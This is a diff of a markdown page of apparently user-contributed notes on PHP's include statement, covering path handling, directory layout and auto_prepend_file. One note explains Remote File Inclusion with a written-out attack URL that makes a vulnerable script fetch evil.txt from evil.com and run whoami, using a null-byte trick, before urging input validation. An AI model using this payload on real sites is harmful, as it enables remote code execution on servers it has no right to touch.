@@ -11,7 +11,7 @@ include $_SERVER['DOCUMENT_ROOT']."/lib/sample.lib.php";
 ```
 <br>So you can move script anywhere in web-project tree without changes.  
 
-#
+---
 
 If you want to have include files, but do not want them to be accessible directly from the client side, please, please, for the love of keyboard, do not do this:<br><br>
 
@@ -45,7 +45,7 @@ include __DIR__ . '/../src/includeFile.php';
 ```
 <br><br>Since user can&apos;t type &apos;your.site/../src/includeFile.php&apos;, your includeFile(s) would not be accessible to the user directly.  
 
-#
+---
 
 Before using php&apos;s include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).<br><br>As example #3 points out, it is possible to include a php file from a remote server.<br><br>The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation.  Suppose you have an example.php with code:<br><br>
 
@@ -70,11 +70,11 @@ evil.txt
 ```
 <br><br>It is a text file so it would not be processed on my server but on the target/victim server.  I would browse to:<br>h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00<br><br>The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.  In this case, it is whoami.  I ended the path variable with a %00, which is the null character.  The original include statement in the example.php would ignore the rest of the line.  It should tell me who the web server is running as.<br><br>Please use proper input validation if you use variables in an include statement.  
 
-#
+---
 
 I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();<br>Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.  
 
-#
+---
 
 As a rule of thumb, never include files using relative paths. To do this efficiently, you can define constants as follows:<br><br>----<br>
 
@@ -113,7 +113,7 @@ include(dirname(dirname(__FILE__)) . '/prepend.php');
 ```
 <br>--<br><br>This way, the prepend.php at the top always gets executed and you&apos;ll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.  
 
-#
+---
 
 [Official documentation page](https://www.php.net/manual/en/function.include.php)
 
